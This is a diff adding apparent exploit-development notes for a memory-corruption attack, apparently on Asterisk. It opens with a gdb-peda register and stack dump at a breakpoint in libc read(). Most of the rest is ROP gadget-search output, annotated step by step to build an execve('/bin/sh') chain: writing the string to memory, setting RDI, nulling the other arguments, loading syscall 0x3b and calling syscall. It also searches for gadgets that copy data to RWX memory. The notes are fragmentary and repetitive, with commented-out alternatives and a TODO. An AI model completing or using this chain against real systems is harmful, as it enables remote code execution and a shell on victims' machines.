@@ -1,0 +1,407 @@
+---------------------------------------------------------------------------------
+[----------------------------------registers-----------------------------------]
+RAX: 0x1 
+RBX: 0x7fffd8000920 --> 0x7ffffbad2483 
+RCX: 0xffffffffffffffff 
+RDX: 0x1 
+RSI: 0x7fffd80009a3 --> 0xa000000000041 ('A')
+RDI: 0x0 
+RBP: 0x7ffff7799260 --> 0xfbad2884 
+RSP: 0x7fff95aa4598 --> 0x7ffff745ae88 (<_IO_file_underflow+296>:	cmp    rax,0x0)
+RIP: 0x7ffff74c6f68 (<read+72>:	ret)
+R8 : 0x7fff95aa9700 (0x00007fff95aa9700)
+R9 : 0x0 
+R10: 0x0 
+R11: 0x0 
+R12: 0xa ('\n')
+R13: 0x0 
+R14: 0x7fffd80009a4 --> 0xd8000a0000000000 
+R15: 0x7fff95aa59d8 --> 0x0
+EFLAGS: 0x207 (CARRY PARITY adjust zero sign trap INTERRUPT direction overflow)
+[-------------------------------------code-------------------------------------]
+   0x7ffff74c6f5c <read+60>:	add    rsp,0x8
+   0x7ffff74c6f60 <read+64>:	cmp    rax,0xfffffffffffff001
+   0x7ffff74c6f66 <read+70>:	jae    0x7ffff74c6f69 <read+73>
+=> 0x7ffff74c6f68 <read+72>:	ret    
+   0x7ffff74c6f69 <read+73>:	
+    mov    rcx,QWORD PTR [rip+0x2d0eb0]        # 0x7ffff7797e20
+   0x7ffff74c6f70 <read+80>:	xor    edx,edx
+   0x7ffff74c6f72 <read+82>:	sub    rdx,rax
+   0x7ffff74c6f75 <read+85>:	mov    DWORD PTR fs:[rcx],edx
+[------------------------------------stack-------------------------------------]
+0000| 0x7fff95aa4598 --> 0x7ffff745ae88 (<_IO_file_underflow+296>:	cmp    rax,0x0)
+0008| 0x7fff95aa45a0 --> 0xdadadadadadadada 
+0016| 0x7fff95aa45a8 --> 0x7fffd8000920 --> 0x7ffffbad2483 
+0024| 0x7fff95aa45b0 --> 0xc80 
+0032| 0x7fff95aa45b8 --> 0x7ffff745bece (<_IO_default_uflow+14>:	cmp    eax,0xffffffff)
+0040| 0x7fff95aa45c0 --> 0x7fffd8000920 --> 0x7ffffbad2483 
+0048| 0x7fff95aa45c8 --> 0x7ffff745001a (<_IO_getline_info+170>:	cmp    eax,0xffffffff)
+0056| 0x7fff95aa45d0 --> 0xdadadadadadadada 
+[------------------------------------------------------------------------------]
+Legend: code, data, rodata, value
+
+Breakpoint 1, 0x00007ffff74c6f68 in read ()
+   from /lib/x86_64-linux-gnu/libc.so.6
+gdb-peda$ thr
+[Current thread is 44 (Thread 0x7fff95aa9700 (LWP 2528))]
+---------------------------------------------------------------------------------
+
+1114 Looking for gadgets at 0x7ffff745aeb0
+1115 4|r|
+1116 0x7ffff745aeb0  add    rsp,0x8
+1117 0x7ffff745aeb4  pop    rbx
+1118 0x7ffff745aeb5  pop    rbp
+1119 0x7ffff745aeb6  ret
+
+** Set &{"/bin/sh\0"} in rdi **
+** write string to mem **
+1020 Looking for gadgets at 0x7ffff745bee2
+1021 2|r|
+1022 0x7ffff745bee2  pop    rbx
+1023 0x7ffff745bee3  ret
+** pop addr into RDI **
+ 756 Looking for gadgets at 0x7ffff7450055
+ 757 2|r|
+ 758 0x7ffff7450055  pop    rdi
+ 759 0x7ffff7450056  ret
+--
+ 653 Looking for gadgets at 0x7ffff74c6f5c
+ 654 4|r|
+ 655 0x7ffff74c6f5c  add    rsp,0x8
+ 656 0x7ffff74c6f60  cmp    rax,0xfffffffffffff001
+ 657 0x7ffff74c6f66  jae    0x7ffff74c6f69 <read+73>
+ 658 0x7ffff74c6f68  ret
+--
+1114 Looking for gadgets at 0x7ffff745aeb0
+1115 4|r|
+1116 0x7ffff745aeb0  add    rsp,0x8
+1117 0x7ffff745aeb4  pop    rbx
+1118 0x7ffff745aeb5  pop    rbp // 0x0 - 0xa (r12 = 0xa)
+1119 0x7ffff745aeb6  ret
+--
+ 682 Looking for gadgets at 0x7ffff745be6b
+ 683 2|r|
+ 684 0x7ffff745be6b  pop    rbx
+ 685 0x7ffff745be6c  ret
+--
+# no need to set rax
+ 851 Looking for gadgets at 0x7ffff7450095
+ 852 11|r|
+ 853 0x7ffff7450095  mov    rcx,QWORD PTR [rsp]
+ 854 0x7ffff7450099  lea    rax,[rbp+r12*1+0x0] // rax becomes -1
+ 855 0x7ffff745009e  mov    QWORD PTR [rbx+0x8],rcx
+ 856 0x7ffff74500a2  add    rsp,0x28
+ 857 0x7ffff74500a6  pop    rbx
+ 858 0x7ffff74500a7  pop    rbp
+ 859 0x7ffff74500a8  pop    r12
+ 860 0x7ffff74500aa  pop    r13
+ 861 0x7ffff74500ac  pop    r14
+ 862 0x7ffff74500ae  pop    r15 // 0x3b
+ 863 0x7ffff74500b0  ret
+
+#########################################################
+** set third argument of execve to NULL **
+ 589 Looking for gadgets at 0x7ffff7450040
+ 590 10|r|
+ 591 0x7ffff7450040  mov    rax,r15
+ 592 0x7ffff7450043  sub    rax,QWORD PTR [rsp+0x8] // 0
+ 593 0x7ffff7450048  add    rsp,0x28
+ 594 0x7ffff745004c  pop    rbx
+ 595 0x7ffff745004d  pop    rbp
+ 596 0x7ffff745004e  pop    r12
+ 597 0x7ffff7450050  pop    r13
+ 598 0x7ffff7450052  pop    r14
+ 599 0x7ffff7450054  pop    r15 // 0x3b
+ 600 0x7ffff7450056  ret
+#########################################################
+
+#1551 Looking for gadgets at 0x7ffff74c6ff0
+#1552 7|r|
+#1553 0x7ffff74c6ff0  mov    rcx,QWORD PTR [rip+0x2d0e29]        # 0x7ffff7797e20
+#1554 0x7ffff74c6ff7  xor    edx,edx
+#1555 0x7ffff74c6ff9  sub    rdx,rax // -1
+#1556 0x7ffff74c6ffc  mov    DWORD PTR fs:[rcx],edx
+#1557 0x7ffff74c6fff  or     rax,0xffffffffffffffff
+#1558 0x7ffff74c7003  jmp    0x7ffff74c6fef <access+15>
+#1559 0x7ffff74c6fef  ret
+1551 Looking for gadgets at 0x7ffff74c6f5c
+   0x00007ffff74c6f5c <+60>:	add    rsp,0x8
+   0x00007ffff74c6f60 <+64>:	cmp    rax,0xfffffffffffff001 // rax should be -1
+   0x00007ffff74c6f66 <+70>:	jae    0x7ffff74c6f69 <read+73>
+   0x00007ffff74c6f68 <+72>:	ret    
+   0x00007ffff74c6f69 <+73>:	mov    rcx,QWORD PTR [rip+0x2d0eb0]        # 0x7ffff7797e20
+   0x00007ffff74c6f70 <+80>:	xor    edx,edx
+   0x00007ffff74c6f72 <+82>:	sub    rdx,rax
+   0x00007ffff74c6f75 <+85>:	mov    DWORD PTR fs:[rcx],edx
+   0x00007ffff74c6f78 <+88>:	or     rax,0xffffffffffffffff
+   0x00007ffff74c6f7c <+92>:	jmp    0x7ffff74c6f68 <read+72>
+--
+1114 Looking for gadgets at 0x7ffff745aeb0
+1115 4|r|
+1116 0x7ffff745aeb0  add    rsp,0x8
+1117 0x7ffff745aeb4  pop    rbx //buffer pointer
+1118 0x7ffff745aeb5  pop    rbp
+1119 0x7ffff745aeb6  ret
+--
+# 682 Looking for gadgets at 0x7ffff745be6b
+# 683 2|r|
+# 684 0x7ffff745be6b  pop    rbx
+# 685 0x7ffff745be6c  ret
+# 932 Looking for gadgets at 0x7ffff745beda
+# 933 4|r|
+# 934 0x7ffff745beda  add    rdx,0x1
+# 935 0x7ffff745bede  mov    QWORD PTR [rbx+0x8],rdx !! rbx !! "gdb$ set .." TODO
+# 936 0x7ffff745bee2  pop    rbx
+# 937 0x7ffff745bee3  ret
+ 101 Looking for gadgets at 0x7ffff745be07
+ 102 11|r|
+ 103 0x7ffff745be07  mov    edx,eax // 0
+ 104 0x7ffff745be09  or     eax,0x1
+ 105 0x7ffff745be0c  and    edx,0xfffffffe
+ 106 0x7ffff745be0f  test   ecx,ecx
+ 107 0x7ffff745be11  mov    QWORD PTR [rbx+0x38],rbp
+ 108 0x7ffff745be15  cmove  edx,eax
+ 109 0x7ffff745be18  mov    rbp,QWORD PTR [rsp+0x20]
+ 110 0x7ffff745be1d  mov    DWORD PTR [rbx],edx
+ 111 0x7ffff745be1f  mov    rbx,QWORD PTR [rsp+0x18]
+ 112 0x7ffff745be24  add    rsp,0x28
+ 113 0x7ffff745be28  ret
+--
+** set syscall number of execve 0x3b **
+ 589 Looking for gadgets at 0x7ffff7450040
+ 590 10|r|
+ 591 0x7ffff7450040  mov    rax,r15 // 0x3b
+ 592 0x7ffff7450043  sub    rax,QWORD PTR [rsp+0x8] // 0x0
+ 593 0x7ffff7450048  add    rsp,0x28
+ 594 0x7ffff745004c  pop    rbx
+ 595 0x7ffff745004d  pop    rbp
+ 596 0x7ffff745004e  pop    r12
+ 597 0x7ffff7450050  pop    r13
+ 598 0x7ffff7450052  pop    r14
+ 599 0x7ffff7450054  pop    r15
+ 600 0x7ffff7450056  ret // syscall
+
+** execute syscall **
+ 525 Looking for gadgets at 0x7ffff74c6f2e
+ 526 4|r|
+ 527 0x7ffff74c6f2e  syscall
+ 528 0x7ffff74c6f30  cmp    rax,0xfffffffffffff001
+ 529 0x7ffff74c6f36  jae    0x7ffff74c6f69 <read+73>
+ 530 0x7ffff74c6f38  ret
+
+
+
+
+
+
+
+
+
+
+..
+
+
+
+
+ 756 Looking for gadgets at 0x7ffff7450055
+ 757 2|r|
+ 758 0x7ffff7450055  pop    rdi
+ 759 0x7ffff7450056  ret
+
+ 589 Looking for gadgets at 0x7ffff7450040
+ 590 10|r|
+ 591 0x7ffff7450040  mov    rax,r15
+ 592 0x7ffff7450043  sub    rax,QWORD PTR [rsp+0x8]
+ 593 0x7ffff7450048  add    rsp,0x28
+ 594 0x7ffff745004c  pop    rbx
+ 595 0x7ffff745004d  pop    rbp
+ 596 0x7ffff745004e  pop    r12
+ 597 0x7ffff7450050  pop    r13
+ 598 0x7ffff7450052  pop    r14
+ 599 0x7ffff7450054  pop    r15
+ 600 0x7ffff7450056  ret
+
+1283 Looking for gadgets at 0x7ffff74500c0
+1284 11|r|
+1285 0x7ffff74500c0  mov    rax,r15
+1286 0x7ffff74500c3  sub    rax,QWORD PTR [rsp+0x8]
+1287 0x7ffff74500c8  jmp    0x7ffff7450048 <_IO_getline_info+216>
+1288 0x7ffff7450048  add    rsp,0x28
+1289 0x7ffff745004c  pop    rbx
+1290 0x7ffff745004d  pop    rbp
+1291 0x7ffff745004e  pop    r12
+1292 0x7ffff7450050  pop    r13
+1293 0x7ffff7450052  pop    r14
+1294 0x7ffff7450054  pop    r15
+1295 0x7ffff7450056  ret
+
+..5bece.txt
+ 101 Looking for gadgets at 0x7ffff745be07
+ 102 11|r|
+ 103 0x7ffff745be07  mov    edx,eax
+ 104 0x7ffff745be09  or     eax,0x1
+ 105 0x7ffff745be0c  and    edx,0xfffffffe
+ 106 0x7ffff745be0f  test   ecx,ecx
+ 107 0x7ffff745be11  mov    QWORD PTR [rbx+0x38],rbp
+ 108 0x7ffff745be15  cmove  edx,eax
+ 109 0x7ffff745be18  mov    rbp,QWORD PTR [rsp+0x20]
+ 110 0x7ffff745be1d  mov    DWORD PTR [rbx],edx
+ 111 0x7ffff745be1f  mov    rbx,QWORD PTR [rsp+0x18]
+ 112 0x7ffff745be24  add    rsp,0x28
+ 113 0x7ffff745be28  ret
+
+ 932 Looking for gadgets at 0x7ffff745beda
+ 933 4|r|
+ 934 0x7ffff745beda  add    rdx,0x1
+ 935 0x7ffff745bede  mov    QWORD PTR [rbx+0x8],rdx
+ 936 0x7ffff745bee2  pop    rbx
+ 937 0x7ffff745bee3  ret
+
+..c6f42.txt
+ 525 Looking for gadgets at 0x7ffff74c6f2e
+ 526 4|r|
+ 527 0x7ffff74c6f2e  syscall
+ 528 0x7ffff74c6f30  cmp    rax,0xfffffffffffff001
+ 529 0x7ffff74c6f36  jae    0x7ffff74c6f69 <read+73>
+ 530 0x7ffff74c6f38  ret
+
+
+.. Search for gadgets that can copy data to the RWX memory ..
+
+
+fg_asterisk_libc_0x00007ffff74c6f4d.txt:2|r|
+fg_asterisk_libc_0x00007ffff74c6f4d.txt-0x7ffff74c6f95	push   QWORD PTR [rbx+0x31]
+fg_asterisk_libc_0x00007ffff74c6f4d.txt-0x7ffff74c6f98	ret
+
+
+fg_asterisk_libc_0x00007ffff74c6f4d.txt:2|r|
+fg_asterisk_libc_0x00007ffff74c6f4d.txt-0x7ffff74c6fec	push   QWORD PTR [rbx+0x1]
+fg_asterisk_libc_0x00007ffff74c6f4d.txt-0x7ffff74c6fef	ret
+
+
+fg_asterisk_libc_0x00007ffff745bece.txt:3|r|
+fg_asterisk_libc_0x00007ffff745bece.txt-0x7ffff745bedf	mov    DWORD PTR [rbx+0x8],edx
+fg_asterisk_libc_0x00007ffff745bece.txt-0x7ffff745bee2	pop    rbx
+fg_asterisk_libc_0x00007ffff745bece.txt-0x7ffff745bee3	ret
+fg_asterisk_libc_0x00007ffff745bece.txt:3|r|
+fg_asterisk_libc_0x00007ffff745bece.txt-0x7ffff745bede	mov    QWORD PTR [rbx+0x8],rdx
+fg_asterisk_libc_0x00007ffff745bece.txt-0x7ffff745bee2	pop    rbx
+fg_asterisk_libc_0x00007ffff745bece.txt-0x7ffff745bee3	ret
+
+fg_asterisk_libc_0x00007ffff745bece.txt:3|r|
+fg_asterisk_libc_0x00007ffff745bece.txt-0x7ffff745be1f	mov    rbx,QWORD PTR [rsp+0x18]
+fg_asterisk_libc_0x00007ffff745bece.txt-0x7ffff745be24	add    rsp,0x28
+fg_asterisk_libc_0x00007ffff745bece.txt-0x7ffff745be28	ret
+fg_asterisk_libc_0x00007ffff745bece.txt:3|r|
+fg_asterisk_libc_0x00007ffff745bece.txt-0x7ffff745be20	mov    ebx,DWORD PTR [rsp+0x18]
+fg_asterisk_libc_0x00007ffff745bece.txt-0x7ffff745be24	add    rsp,0x28
+fg_asterisk_libc_0x00007ffff745bece.txt-0x7ffff745be28	ret
+
+
+ 851 Looking for gadgets at 0x7ffff7450095
+ 852 11|r|
+ 853 0x7ffff7450095  mov    rcx,QWORD PTR [rsp]
+ 854 0x7ffff7450099  lea    rax,[rbp+r12*1+0x0]
+ 855 0x7ffff745009e  mov    QWORD PTR [rbx+0x8],rcx
+ 856 0x7ffff74500a2  add    rsp,0x28
+ 857 0x7ffff74500a6  pop    rbx
+ 858 0x7ffff74500a7  pop    rbp
+ 859 0x7ffff74500a8  pop    r12
+ 860 0x7ffff74500aa  pop    r13
+ 861 0x7ffff74500ac  pop    r14
+ 862 0x7ffff74500ae  pop    r15
+ 863 0x7ffff74500b0  ret
+
+fg_asterisk_libc_0x00007ffff74c6f4d.txt:4|r|
+fg_asterisk_libc_0x00007ffff74c6f4d.txt-0x7ffff74c6ffd	mov    DWORD PTR [rcx],edx
+fg_asterisk_libc_0x00007ffff74c6f4d.txt-0x7ffff74c6fff	or     rax,0xffffffffffffffff
+fg_asterisk_libc_0x00007ffff74c6f4d.txt-0x7ffff74c7003	jmp    0x7ffff74c6fef <access+15>
+fg_asterisk_libc_0x00007ffff74c6f4d.txt-0x7ffff74c6fef	ret
+
+fg_asterisk_libc_0x00007ffff745bece.txt:4|r|
+fg_asterisk_libc_0x00007ffff745bece.txt-0x7ffff745be21	pop    rsp
+fg_asterisk_libc_0x00007ffff745bece.txt-0x7ffff745be22	and    al,0x18
+fg_asterisk_libc_0x00007ffff745bece.txt-0x7ffff745be24	add    rsp,0x28
+fg_asterisk_libc_0x00007ffff745bece.txt-0x7ffff745be28	ret
+
+
+ 969 Looking for gadgets at 0x7ffff745bede
+ 970 3|r|
+ 971 0x7ffff745bede  mov    QWORD PTR [rbx+0x8],rdx
+ 972 0x7ffff745bee2  pop    rbx
+ 973 0x7ffff745bee3  ret
+
+
+
+ 746 Looking for gadgets at 0x7ffff745ae8e
+ 747 12|r|
+ 748 0x7ffff745ae8e  mov    rdx,QWORD PTR [rbx+0x90]
+ 749 0x7ffff745ae95  add    QWORD PTR [rbx+0x10],rax
+ 750 0x7ffff745ae99  cmp    rdx,0xffffffffffffffff
+ 751 0x7ffff745ae9d  je     0x7ffff745aea9 <_IO_file_underflow+329>
+ 752 0x7ffff745ae9f  add    rax,rdx
+ 753 0x7ffff745aea2  mov    QWORD PTR [rbx+0x90],rax
+ 754 0x7ffff745aea9  mov    rax,QWORD PTR [rbx+0x8]
+ 755 0x7ffff745aead  movzx  eax,BYTE PTR [rax]
+ 756 0x7ffff745aeb0  add    rsp,0x8
+ 757 0x7ffff745aeb4  pop    rbx
+ 758 0x7ffff745aeb5  pop    rbp
+ 759 0x7ffff745aeb6  ret
+..
+ 184 Looking for gadgets at 0x7ffff745be0f
+ 185 8|r|
+ 186 0x7ffff745be0f  test   ecx,ecx
+ 187 0x7ffff745be11  mov    QWORD PTR [rbx+0x38],rbp
+ 188 0x7ffff745be15  cmove  edx,eax
+ 189 0x7ffff745be18  mov    rbp,QWORD PTR [rsp+0x20]
+ 190 0x7ffff745be1d  mov    DWORD PTR [rbx],edx
+ 191 0x7ffff745be1f  mov    rbx,QWORD PTR [rsp+0x18]
+ 192 0x7ffff745be24  add    rsp,0x28
+ 193 0x7ffff745be28  ret
+..
+ 242 Looking for gadgets at 0x7ffff745be15
+ 243 6|r|
+ 244 0x7ffff745be15  cmove  edx,eax
+ 245 0x7ffff745be18  mov    rbp,QWORD PTR [rsp+0x20]
+ 246 0x7ffff745be1d  mov    DWORD PTR [rbx],edx
+ 247 0x7ffff745be1f  mov    rbx,QWORD PTR [rsp+0x18]
+ 248 0x7ffff745be24  add    rsp,0x28
+ 249 0x7ffff745be28  ret
+..
+
+
+
+..
+ 94 Looking for gadgets at 0x7ffff744ee3b
+ 95 6|r|
+ 96 0x7ffff744ee3b  jmp    0x7ffff744ed57 <fgetpos64+231>
+ 97 0x7ffff744ed57  add    rsp,0x8
+ 98 0x7ffff744ed5b  mov    eax,esi
+ 99 0x7ffff744ed5d  pop    rbx
+100 0x7ffff744ed5e  pop    rbp
+101 0x7ffff744ed5f  ret
+..
+ 601 Looking for gadgets at 0x7ffff7450041
+ 602 10|r|
+ 603 0x7ffff7450041  mov    eax,edi
+ 604 0x7ffff7450043  sub    rax,QWORD PTR [rsp+0x8]
+ 605 0x7ffff7450048  add    rsp,0x28
+ 606 0x7ffff745004c  pop    rbx
+ 607 0x7ffff745004d  pop    rbp
+ 608 0x7ffff745004e  pop    r12
+ 609 0x7ffff7450050  pop    r13
+ 610 0x7ffff7450052  pop    r14
+ 611 0x7ffff7450054  pop    r15
+ 612 0x7ffff7450056  ret
+..
+
+
+
+
+** set second argument of execve to NULL **
+..5001a.txt
+ 747 Looking for gadgets at 0x7ffff7450053
+ 748 3|r|
+ 749 0x7ffff7450053  pop    rsi
+ 750 0x7ffff7450054  pop    r15
+ 751 0x7ffff7450056  ret
